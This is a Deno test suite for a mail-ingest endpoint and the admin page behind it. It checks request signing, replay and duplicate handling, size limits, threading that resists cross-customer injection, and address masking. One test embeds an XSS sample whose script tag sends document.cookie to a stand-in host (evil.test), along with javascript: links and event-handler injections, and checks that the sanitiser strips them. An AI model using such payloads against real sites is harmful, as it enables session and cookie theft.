// mail-ingest accepts input composed entirely by strangers and writes it to the
// table the /admin page reads. It is the softest-looking target in the system:
// public (verify_jwt = false), a WRITE, and downstream of it is the one page
// that renders customer data.
//
// So these tests attack it the way admin-data.test.ts attacks its neighbour —
// unsigned, wrongly signed, stale, replayed, cross-signed with the OTHER
// endpoint's secret, oversized, malformed — and then attack the data itself:
// script tags, forged threading headers aimed at another customer's
// conversation, and duplicate delivery.

import { assert, assertEquals } from 'jsr:@std/assert@1'
import { signAdminRequest } from '../../functions/_shared/admin-auth.ts'
import { adminClient, loadTestKeys, requireStack, SUPABASE_URL } from '../helpers.ts'

requireStack()
const admin = adminClient()
const { mailIngestSecret, adminDataSecret } = await loadTestKeys()

const PATH = '/functions/v1/mail-ingest'
const URL_ = `${SUPABASE_URL}${PATH}`
const ADMIN_PATH = '/functions/v1/admin-data'
const ADMIN_URL = `${SUPABASE_URL}${ADMIN_PATH}`

async function post(
  payload: unknown,
  opts: { secret?: string; ts?: number; path?: string; bodyOverride?: string; method?: string } = {},
) {
  const body = JSON.stringify(payload)
  // Signs `body` and sends `bodyOverride`: that difference is the point of the
  // body-swap case, so the signature must cover what was SIGNED, not what goes
  // out on the wire.
  const headers = await signAdminRequest(
    opts.secret ?? mailIngestSecret,
    opts.method ?? 'POST',
    opts.path ?? PATH,
    body,
    opts.ts,
  )
  const res = await fetch(URL_, {
    method: opts.method ?? 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: opts.bodyOverride ?? body,
  })
  const text = await res.text()
  let parsed: unknown = null
  try {
    parsed = text ? JSON.parse(text) : null
  } catch {
    parsed = { raw: text }
  }
  return { status: res.status, body: (parsed ?? {}) as Record<string, unknown> }
}

// Signs exactly the bytes it sends, so any rejection is the endpoint's doing
// rather than the signature's.
async function postRaw(body: string, opts: { secret?: string; ts?: number } = {}) {
  const headers = await signAdminRequest(opts.secret ?? mailIngestSecret, 'POST', PATH, body, opts.ts)
  const res = await fetch(URL_, { method: 'POST', headers: { 'Content-Type': 'application/json', ...headers }, body })
  const text = await res.text()
  let parsed: unknown = null
  try {
    parsed = text ? JSON.parse(text) : null
  } catch {
    parsed = { raw: text }
  }
  return { status: res.status, body: (parsed ?? {}) as Record<string, unknown> }
}

async function postSigned(payload: unknown, opts: { secret?: string; ts?: number } = {}) {
  return await postRaw(JSON.stringify(payload), opts)
}

async function adminCall(payload: unknown, secret = adminDataSecret) {
  const body = JSON.stringify(payload)
  const headers = await signAdminRequest(secret, 'POST', ADMIN_PATH, body)
  const res = await fetch(ADMIN_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body,
  })
  const text = await res.text()
  let parsed: unknown = null
  try {
    parsed = text ? JSON.parse(text) : null
  } catch {
    parsed = { raw: text }
  }
  return { status: res.status, body: (parsed ?? {}) as Record<string, unknown> }
}

function mail(overrides: Record<string, unknown> = {}) {
  const tag = crypto.randomUUID().slice(0, 8)
  return {
    envelope_from: `sender-${tag}@ingest.test`,
    envelope_to: 'hello@orchestra-automation.com',
    from: `Sender ${tag} <sender-${tag}@ingest.test>`,
    to: 'Orchestra <hello@orchestra-automation.com>',
    subject: `Ingest case ${tag}`,
    message_id: `<${tag}@ingest.test>`,
    text: 'the body of the message',
    ...overrides,
  }
}

async function cleanup(participant: string) {
  const { data } = await admin.from('mail_threads').select('id').eq('participant_email', participant)
  const ids = (data ?? []).map((t) => t.id as string)
  if (ids.length > 0) {
    await admin.from('mail_messages').delete().in('thread_id', ids)
    await admin.from('mail_threads').delete().in('id', ids)
  }
}

// ---------- authentication ----------

Deno.test('90. a correctly signed message is stored', async () => {
  const m = mail()
  try {
    const res = await postSigned(m)
    assertEquals(res.status, 200)
    assertEquals(res.body.stored, true)

    const { data } = await admin
      .from('mail_messages')
      .select('direction, from_email, subject, body_text, read_at')
      .eq('message_id', m.message_id)
      .single()
    assertEquals(data!.direction, 'inbound')
    assertEquals(data!.from_email, m.envelope_from)
    assertEquals(data!.body_text, 'the body of the message')
    assertEquals(data!.read_at, null, 'arrives unread')
  } finally {
    await cleanup(m.envelope_from)
  }
})

Deno.test('91. every unauthenticated shape is a 404, not a 401', async () => {
  const body = JSON.stringify(mail())

  // No signature headers at all.
  const bare = await fetch(URL_, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body })
  await bare.body?.cancel()
  assertEquals(bare.status, 404, 'an unsigned request must not reveal the endpoint')

  // Wrong secret.
  assertEquals((await post(mail(), { secret: 'x'.repeat(40) })).status, 404)

  // Signature minted for a different function.
  assertEquals((await post(mail(), { path: '/functions/v1/admin-data' })).status, 404)

  // Body swapped after signing.
  assertEquals(
    (await post(mail(), { bodyOverride: JSON.stringify(mail({ text: 'forged' })) })).status,
    404,
    'the body hash is inside the signature',
  )

  // Stale and future timestamps.
  const now = Math.floor(Date.now() / 1000)
  assertEquals((await post(mail(), { ts: now - 3600 })).status, 404)
  assertEquals((await post(mail(), { ts: now + 3600 })).status, 404)

  // GET.
  const get = await fetch(URL_)
  await get.body?.cancel()
  assertEquals(get.status, 404)
})

Deno.test('92. the two endpoints do not share a key — neither secret opens the other', async () => {
  // The whole reason mail-ingest has its own secret: Cloudflare and Vercel are
  // separate trust domains, and a Worker compromise must not become a read of
  // the purchase table.
  assert(mailIngestSecret !== adminDataSecret, 'the fixtures must differ or this proves nothing')

  const withAdminKey = await post(mail(), { secret: adminDataSecret })
  assertEquals(withAdminKey.status, 404, 'the website key must not open mail ingest')

  const withMailKey = await adminCall({ view: 'purchases' }, mailIngestSecret)
  assertEquals(withMailKey.status, 404, 'the Worker key must not open the purchase list')
})

// ---------- replay and duplicates ----------

Deno.test('93. the same message twice is stored once', async () => {
  const m = mail()
  try {
    const first = await postSigned(m)
    assertEquals(first.body.stored, true)

    // A Cloudflare retry, a double-bound route, or a captured request replayed
    // inside the freshness window all look like this.
    const second = await postSigned(m)
    assertEquals(second.status, 200, 'a duplicate is a success, not an error')
    assertEquals(second.body.stored, false)
    assertEquals(second.body.reason, 'duplicate')

    const { data } = await admin.from('mail_messages').select('id').eq('message_id', m.message_id)
    assertEquals(data!.length, 1, 'exactly one row')
  } finally {
    await cleanup(m.envelope_from)
  }
})

Deno.test('94. a message with no Message-ID still deduplicates on its content', async () => {
  const m = mail({ message_id: undefined })
  try {
    assertEquals((await postSigned(m)).body.stored, true)
    assertEquals((await postSigned(m)).body.stored, false)

    const { data } = await admin.from('mail_messages').select('id').eq('from_email', m.envelope_from)
    assertEquals(data!.length, 1)
  } finally {
    await cleanup(m.envelope_from)
  }
})

// ---------- hostile input ----------

Deno.test('95. malformed input is refused without storing a half-message', async () => {
  for (
    const payload of [
      mail({ envelope_from: 'not-an-address', from: 'also not one' }),
      mail({ envelope_from: '', from: '' }),
      mail({ text: '', html: '' }),
      {},
      { subject: 'orphan' },
    ]
  ) {
    const res = await postSigned(payload)
    assertEquals(res.status, 200, `should be handled, not error: ${JSON.stringify(payload)}`)
    assertEquals(res.body.stored, false)
    assertEquals(res.body.reason, 'unusable')
  }

  // Correctly signed, but not a JSON object. Signed and sent as the same bytes
  // so the 404 is the body being rejected, not the signature.
  for (const raw of ['[]', 'not json', '"a string"', 'null']) {
    assertEquals((await postRaw(raw)).status, 404, `should reject the body ${JSON.stringify(raw)}`)
  }

  // An empty body is the one that is answered rather than refused: it parses
  // to {}, which is a message with nothing in it, and lands on the same
  // "unusable" reply as a message with no sender. Same outcome, and the caller
  // gets told rather than left guessing.
  const empty = await postRaw('')
  assertEquals(empty.status, 200)
  assertEquals(empty.body.stored, false)
})

Deno.test('96. an oversized request is refused outright', async () => {
  // 1 MB is the ceiling. Over it the endpoint never buffers the body — and the
  // message is not lost: the Worker forwarded it before it posted.
  const res = await postSigned(mail({ text: 'x'.repeat(1_200_000) }))
  assertEquals(res.status, 404)

  // Just under the request cap, but over the stored body cap: kept, cut, and
  // flagged so a half-read complaint is not mistaken for the whole of it.
  const m = mail({ text: 'y'.repeat(200_000) })
  try {
    assertEquals((await postSigned(m)).body.stored, true)
    const { data } = await admin
      .from('mail_messages')
      .select('body_text, truncated')
      .eq('message_id', m.message_id)
      .single()
    assertEquals((data!.body_text as string).length, 64 * 1024)
    assertEquals(data!.truncated, true)
  } finally {
    await cleanup(m.envelope_from)
  }
})

Deno.test('97. hostile html never reaches the database intact', async () => {
  const m = mail({
    text: '',
    html: [
      '<p>Hello</p>',
      '<script>fetch("https://evil.test/?c="+document.cookie)</script>',
      '<img src="https://tracker.test/pixel.gif">',
      '<a href="javascript:alert(1)" target="_blank">click</a>',
      '<a href="https://legit.test" onclick="steal()">real link</a>',
      '<iframe src="https://evil.test"></iframe>',
      '<style>body{display:none}</style>',
    ].join(''),
  })
  try {
    assertEquals((await postSigned(m)).body.stored, true)

    const { data } = await admin
      .from('mail_messages')
      .select('body_text, body_html')
      .eq('message_id', m.message_id)
      .single()

    const html = data!.body_html as string
    for (const needle of ['<script', '<iframe', '<style', '<img', 'javascript:', 'onclick', 'target=', 'tracker.test']) {
      assert(!html.toLowerCase().includes(needle), `${needle} survived into the database: ${html}`)
    }
    assert(html.includes('href="https://legit.test"'), 'a real link survives')
    assert(html.includes('rel="noopener noreferrer nofollow ugc"'))

    // An html-only message is still readable without rendering any markup.
    const text = data!.body_text as string
    assert(text.includes('Hello'), `derived text: ${text}`)
    assert(!text.includes('<'), `derived text carries no markup: ${text}`)
  } finally {
    await cleanup(m.envelope_from)
  }
})

Deno.test('98. attachment bytes are never stored', async () => {
  const m = mail({
    attachments: [{ name: 'proof.png', size: 4096, type: 'image/png', content: 'AAAA'.repeat(2000) }],
  })
  try {
    assertEquals((await postSigned(m)).body.stored, true)
    const { data } = await admin
      .from('mail_messages')
      .select('attachments')
      .eq('message_id', m.message_id)
      .single()
    assertEquals(data!.attachments, [{ name: 'proof.png', size: 4096, type: 'image/png' }])
  } finally {
    await cleanup(m.envelope_from)
  }
})

// ---------- threading ----------

Deno.test('99. a reply joins the thread it is replying to', async () => {
  const tag = crypto.randomUUID().slice(0, 8)
  const from = `threader-${tag}@ingest.test`
  try {
    await postSigned(mail({ envelope_from: from, subject: 'Licence not working', message_id: `<t1-${tag}@x>` }))
    await postSigned(mail({ envelope_from: from, subject: 'Re: Licence not working', message_id: `<t2-${tag}@x>` }))
    await postSigned(mail({ envelope_from: from, subject: 'RE: Fwd: Licence  not working', message_id: `<t3-${tag}@x>` }))

    const { data: threads } = await admin.from('mail_threads').select('id, subject').eq('participant_email', from)
    assertEquals(threads!.length, 1, 'three spellings of one subject are one conversation')

    const { data: messages } = await admin.from('mail_messages').select('id').eq('thread_id', threads![0].id)
    assertEquals(messages!.length, 3)
  } finally {
    await cleanup(from)
  }
})

Deno.test('100. a renamed subject still lands in the thread via References', async () => {
  const tag = crypto.randomUUID().slice(0, 8)
  const from = `renamer-${tag}@ingest.test`
  try {
    await postSigned(mail({ envelope_from: from, subject: 'Original question', message_id: `<r1-${tag}@x>` }))
    await postSigned(mail({
      envelope_from: from,
      subject: 'Completely different subject now',
      message_id: `<r2-${tag}@x>`,
      in_reply_to: `<r1-${tag}@x>`,
      references: [`<r1-${tag}@x>`],
    }))

    const { data: threads } = await admin.from('mail_threads').select('id').eq('participant_email', from)
    assertEquals(threads!.length, 1, 'the reference chain kept it together')
  } finally {
    await cleanup(from)
  }
})

Deno.test('101. In-Reply-To cannot inject a stranger into someone else’s thread', async () => {
  // In-Reply-To is attacker-controlled. Without the same-participant check, a
  // stranger who learned a Message-ID could drop their own text into a
  // customer's conversation and have it read as context about that customer.
  const tag = crypto.randomUUID().slice(0, 8)
  const victim = `victim-${tag}@ingest.test`
  const attacker = `attacker-${tag}@ingest.test`
  try {
    await postSigned(mail({ envelope_from: victim, subject: 'My order', message_id: `<v1-${tag}@x>` }))
    await postSigned(mail({
      envelope_from: attacker,
      subject: 'as I was saying, refund me',
      message_id: `<a1-${tag}@x>`,
      in_reply_to: `<v1-${tag}@x>`,
      references: [`<v1-${tag}@x>`],
    }))

    const { data: victimThreads } = await admin.from('mail_threads').select('id').eq('participant_email', victim)
    const { data: attackerThreads } = await admin.from('mail_threads').select('id').eq('participant_email', attacker)
    assertEquals(victimThreads!.length, 1)
    assertEquals(attackerThreads!.length, 1, 'the attacker gets their own thread')

    const { data: inVictim } = await admin
      .from('mail_messages')
      .select('from_email')
      .eq('thread_id', victimThreads![0].id)
    assertEquals(inVictim!.length, 1)
    assertEquals(inVictim![0].from_email, victim, 'nobody else is in the victim’s thread')
  } finally {
    await cleanup(victim)
    await cleanup(attacker)
  }
})

// ---------- what the admin page can see ----------

Deno.test('102. the thread LIST carries no message text, and masks addresses', async () => {
  const m = mail({ text: 'SECRETBODYMARKER please help' })
  try {
    await postSigned(m)

    const res = await adminCall({ view: 'threads', limit: 100 })
    assertEquals(res.status, 200)
    const rows = res.body.rows as Record<string, unknown>[]
    const row = rows.find((r) => String(r.subject) === m.subject)
    assert(row, 'the thread is listed')

    assert(
      !JSON.stringify(res.body).includes('SECRETBODYMARKER'),
      'a list is a casually-read surface: no body, not even a preview',
    )
    assert(String(row!.participant_email).includes('***'), `masked by default, got ${row!.participant_email}`)
    assert(!String(row!.participant_email).includes(m.envelope_from))
    assertEquals(row!.unread_count, 1)
    assertEquals(row!.message_count, 1)
    assertEquals(res.body.revealed, false)
  } finally {
    await cleanup(m.envelope_from)
  }
})

Deno.test('103. one thread returns bodies; the address unmasks only when asked', async () => {
  const m = mail({ text: 'SECRETBODYMARKER please help', html: '<p>SECRETBODYMARKER</p>' })
  try {
    await postSigned(m)
    const { data: thread } = await admin
      .from('mail_threads')
      .select('id')
      .eq('participant_email', m.envelope_from)
      .single()

    const masked = await adminCall({ view: 'thread', id: thread!.id })
    assertEquals(masked.status, 200)
    const maskedRows = masked.body.rows as Record<string, unknown>[]
    assert(String(maskedRows[0].body_text).includes('SECRETBODYMARKER'), 'opening a thread shows the message')
    assert(String(maskedRows[0].from_email).includes('***'))
    assertEquals(maskedRows[0].from_header, null, 'the From: header contains an address too')

    // body_html is stored but never shipped: the page renders text, and markup
    // a stranger wrote has no business in the admin React tree.
    assert(
      !JSON.stringify(masked.body).includes('<p>'),
      'sanitised html is not shipped to the page',
    )

    const revealed = await adminCall({ view: 'thread', id: thread!.id, reveal: true })
    const revealedRows = revealed.body.rows as Record<string, unknown>[]
    assertEquals(revealedRows[0].from_email, m.envelope_from)
    assertEquals(revealed.body.revealed, true)

    // A bad id is indistinguishable from a nonexistent one.
    assertEquals((await adminCall({ view: 'thread', id: 'not-a-uuid' })).status, 404)
    assertEquals((await adminCall({ view: 'thread', id: crypto.randomUUID() })).status, 404)
  } finally {
    await cleanup(m.envelope_from)
  }
})

Deno.test('104. marking a thread read is idempotent and does not touch other threads', async () => {
  const a = mail()
  const b = mail()
  try {
    await postSigned(a)
    await postSigned(b)

    const before = await adminCall({ view: 'mail-unread' })
    assert(Number(before.body.unread) >= 2)

    const { data: threadA } = await admin
      .from('mail_threads')
      .select('id')
      .eq('participant_email', a.envelope_from)
      .single()

    assertEquals((await adminCall({ view: 'thread-read', id: threadA!.id })).status, 200)
    assertEquals((await adminCall({ view: 'thread-read', id: threadA!.id })).status, 200)

    const { data: readA } = await admin
      .from('mail_messages')
      .select('read_at')
      .eq('message_id', a.message_id)
      .single()
    assert(readA!.read_at !== null, 'A is read')

    const { data: unreadB } = await admin
      .from('mail_messages')
      .select('read_at')
      .eq('message_id', b.message_id)
      .single()
    assertEquals(unreadB!.read_at, null, 'B is untouched')

    assertEquals((await adminCall({ view: 'thread-read', id: 'nope' })).status, 404)
  } finally {
    await cleanup(a.envelope_from)
    await cleanup(b.envelope_from)
  }
})

// ---------- outbound, and the one source of truth ----------

Deno.test('105. a recorded reply is filed into the thread and points at the send log', async () => {
  const m = mail({ subject: 'Refund please' })
  try {
    await postSigned(m)
    const { data: thread } = await admin
      .from('mail_threads')
      .select('id')
      .eq('participant_email', m.envelope_from)
      .single()

    const res = await adminCall({
      view: 'record-email',
      record: {
        to_email: m.envelope_from,
        subject: 'Re: Refund please',
        status: 'sent',
        provider_id: 're_test_123',
        source: 'admin-reply',
        body: 'Refunded — it should land in a few days.',
        thread_id: thread!.id,
      },
    })
    assertEquals(res.status, 200)
    assertEquals(res.body.filed, true)
    assertEquals(res.body.thread_id, thread!.id)

    const { data: outbound } = await admin
      .from('mail_messages')
      .select('direction, body_text, sent_email_id, to_email')
      .eq('thread_id', thread!.id)
      .eq('direction', 'outbound')
      .single()
    assertEquals(outbound!.to_email, m.envelope_from)
    assert(outbound!.sent_email_id, 'an outbound message must point at its send-log row')

    // "did it go out" is answered in exactly one place, and it is not here.
    const { data: log } = await admin
      .from('sent_emails')
      .select('status, provider_id, source')
      .eq('id', outbound!.sent_email_id)
      .single()
    assertEquals(log!.status, 'sent')
    assertEquals(log!.provider_id, 're_test_123')
    assertEquals(Object.keys(outbound!).includes('status'), false, 'the conversation carries no delivery state')
  } finally {
    await cleanup(m.envelope_from)
    await admin.from('sent_emails').delete().eq('to_email', m.envelope_from)
  }
})

Deno.test('106. a FAILED send is logged but filed in no conversation', async () => {
  const to = `failed-${crypto.randomUUID().slice(0, 8)}@ingest.test`
  try {
    const res = await adminCall({
      view: 'record-email',
      record: { to_email: to, subject: 'Never arrived', status: 'failed', error: 'bounced', body: 'hello?' },
    })
    assertEquals(res.body.filed, false, 'it never reached them, so it is not part of the conversation')

    const { data: log } = await admin.from('sent_emails').select('status').eq('to_email', to).single()
    assertEquals(log!.status, 'failed', 'but the send log still records the attempt')

    const { data: threads } = await admin.from('mail_threads').select('id').eq('participant_email', to)
    assertEquals(threads!.length, 0)
  } finally {
    await cleanup(to)
    await admin.from('sent_emails').delete().eq('to_email', to)
  }
})

Deno.test('107. a thread_id belonging to someone else is ignored, not honoured', async () => {
  // A stale id from a previous render must never file what we wrote to one
  // customer into a different customer's conversation.
  const victim = mail()
  const other = `elsewhere-${crypto.randomUUID().slice(0, 8)}@ingest.test`
  try {
    await postSigned(victim)
    const { data: victimThread } = await admin
      .from('mail_threads')
      .select('id')
      .eq('participant_email', victim.envelope_from)
      .single()

    const res = await adminCall({
      view: 'record-email',
      record: {
        to_email: other,
        subject: 'Unrelated answer',
        status: 'sent',
        body: 'this is for somebody else entirely',
        thread_id: victimThread!.id,
      },
    })
    assertEquals(res.body.filed, true)
    assert(res.body.thread_id !== victimThread!.id, 'the mismatched id was refused')

    const { data: inVictim } = await admin
      .from('mail_messages')
      .select('id')
      .eq('thread_id', victimThread!.id)
    assertEquals(inVictim!.length, 1, 'the victim’s thread still holds only their own message')
  } finally {
    await cleanup(victim.envelope_from)
    await cleanup(other)
    await admin.from('sent_emails').delete().eq('to_email', other)
  }
})

Deno.test('108. sending twice to the same person is two messages, not a swallowed duplicate', async () => {
  const to = `twice-${crypto.randomUUID().slice(0, 8)}@ingest.test`
  const record = { to_email: to, subject: 'Any update?', status: 'sent', body: 'Any update?' }
  try {
    assertEquals((await adminCall({ view: 'record-email', record })).body.filed, true)
    assertEquals((await adminCall({ view: 'record-email', record })).body.filed, true)

    const { data: threads } = await admin.from('mail_threads').select('id').eq('participant_email', to)
    assertEquals(threads!.length, 1, 'same subject, same conversation')

    const { data: messages } = await admin.from('mail_messages').select('id').eq('thread_id', threads![0].id)
    assertEquals(messages!.length, 2, 'a chased-up reply is a second message, not a replay')
  } finally {
    await cleanup(to)
    await admin.from('sent_emails').delete().eq('to_email', to)
  }
})
